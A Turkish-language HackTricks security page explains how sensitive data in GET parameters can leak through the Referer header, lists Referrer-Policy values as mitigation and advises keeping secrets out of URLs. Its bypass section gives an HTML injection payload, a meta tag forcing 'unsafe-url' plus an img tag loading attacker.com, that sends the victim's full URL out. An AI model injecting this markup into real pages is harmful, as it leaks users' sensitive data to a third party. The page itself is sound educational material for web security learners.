{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'ı Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek hacking püf noktalarını paylaşın.

</details>
{% endhint %}


# Referans başlıkları ve politika

Referrer, tarayıcıların önceki ziyaret edilen sayfayı belirtmek için kullandığı başlıktır.

## Sızdırılan Hassas Bilgiler

Eğer bir web sayfasının içinde herhangi bir noktada GET isteği parametrelerinde hassas bilgi bulunuyorsa, sayfa harici kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcıyı saldırganın kontrol ettiği bir URL'yi ziyaret etmeye ikna edebiliyorsa (sosyal mühendislik), saldırgan en son GET isteği içindeki hassas bilgiyi dışarıya çıkarabilir.

## Hafifletme

Tarayıcının diğer web uygulamalarına hassas bilginin gönderilmesini **önleyebilecek** bir **Referrer politikası** izlemesini sağlayabilirsiniz:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Karşı Önlem

Bu kuralı geçersiz kılmak için bir HTML meta etiketi kullanabilirsiniz (saldırganın bir HTML enjeksiyonu yapması gerekmektedir):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Savunma

Asla URL içinde GET parametrelerine veya yollara hassas veri koymayın.
